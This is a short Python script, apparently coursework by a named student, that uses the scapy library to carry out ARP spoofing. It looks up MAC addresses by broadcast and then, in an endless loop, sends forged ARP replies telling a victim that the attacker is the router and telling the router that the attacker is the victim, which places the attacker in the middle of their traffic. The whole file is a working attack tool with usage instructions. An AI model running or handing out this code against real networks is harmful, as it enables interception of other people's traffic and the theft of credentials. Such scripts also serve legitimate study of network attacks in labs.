from scapy.all import Ether, ARP, srp, send
from datetime import datetime
import sys

#Required function to print details
def authInfo():
	#Define variables
	author = "Ong Lee Heung, Dominique"
	current_date = datetime.now().strftime("%d/%m/%Y")
	
	#Displays output
	print(f"Author : {author}")
	print(f"Date : {current_date}")

#Function to get and return mac address
def getMac(target_ip):
	#Create ARP request to ask for target_ip, set destination MAC for broadcast
	broadcast_mac = Ether(dst = "ff:ff:ff:ff:ff:ff")
	arp_ip = ARP(pdst = target_ip)
    
	packet = broadcast_mac / arp_ip
    
	#Sends the packet and waits for a return response
	answer = srp(packet, timeout=3, verbose = False)[0] #verbose hides the console output
    
	if answer:
		return answer[0][1].hwsrc
	else:
		print(f"[-] Could not find MAC address for {target_ip}")
		sys.exit(1)
    	
#Function to create fake ARP response
def spoof(target_ip, spoof_ip):
	target_mac = getMac(target_ip)
	
	#Create spoofing packet
	packet = ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
	
	send(packet, verbose = False)
	
if __name__ == "__main__":
	if len(sys.argv) != 3:
		print("Usage : python3 arpspoof.py <Victim IP> <Gateway IP> ")
		sys.exit(1)
		
	victim_ip = sys.argv[1]
	gateway_ip = sys.argv[2]
	
	#Prints author info
	authInfo()
	
	try:
		while True:
		
			#Tells victim that I am the router
			spoof(victim_ip, gateway_ip)
			
			#Tells router that I am the victim
			spoof(gateway_ip, victim_ip)
			print(f"[+] Packets sent to {victim_ip} and {gateway_ip}")
	
	except KeyboardInterrupt:
		print("\n[!] Ctrl+C detected. Stopping attack...")
	
